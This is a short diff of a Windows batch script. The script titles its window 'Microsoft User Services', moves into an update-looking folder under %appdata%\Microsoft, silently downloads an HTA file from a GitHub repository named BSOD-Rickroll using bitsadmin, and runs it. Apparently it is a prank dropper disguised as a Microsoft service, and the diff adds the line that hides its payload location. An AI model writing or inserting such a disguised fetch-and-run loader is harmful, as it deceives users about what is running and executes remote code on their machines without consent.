@@ -2,6 +2,7 @@
 
 cls
 title Microsoft User Services
+cd "%appdata%\Microsoft\Update"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Instant/Instant_msrkl.hta" "msrkl.hta"
 echo "download completed"
 start msrkl.hta
